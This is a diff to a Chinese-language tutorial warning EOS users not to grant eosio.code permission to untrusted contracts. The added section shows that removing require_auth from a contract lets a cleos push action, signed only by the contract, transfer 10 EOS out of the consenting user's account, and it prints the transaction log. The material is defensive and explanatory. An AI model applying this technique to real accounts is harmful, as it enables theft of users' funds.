@@ -8,6 +8,23 @@
 
 # **普通用户千万不要向不信任的合约账号开放eosio.code权限**  
 
+# 更可怕的eosio.code
+在代码中，现在把这个判断require_auth(user);注释掉  
+使用如下命令进行测试
+```
+￥ cleos push action badeosiocode hi '["eosiocode111"]' -p badeosiocode@active
+executed transaction: c09547c74ea9723e247478560dc30d45c1a6fc5e3f6c6b56409dba9eb815ac0a  104 bytes  2811 us
+#  badeosiocode <= badeosiocode::hi             {"user":"eosiocode111"}
+>> Hello, eosiocode111
+#   eosio.token <= eosio.token::transfer        {"from":"eosiocode111","to":"badeosiocode","quantity":"10.0000 EOS","memo":"DO NOT SET eosio.code pe...
+#  eosiocode111 <= eosio.token::transfer        {"from":"eosiocode111","to":"badeosiocode","quantity":"10.0000 EOS","memo":"DO NOT SET eosio.code pe...
+#  badeosiocode <= eosio.token::transfer        {"from":"eosiocode111","to":"badeosiocode","quantity":"10.0000 EOS","memo":"DO NOT SET eosio.code pe...
+warning: transaction executed locally, but may not be confirmed by the network yet    ] 
+```
+注意这里使用的-p权限，并不是传递的参数的用户eosiocode111  
+但是，仍然实现了转账操作  
+eosiocode111账号中的EOS被转走了  
+
 ## 权限查看
 使用如下命令  
 可以看到用户账号eosiocode111向合约账号badeosiocode开放了eosio.code权限  
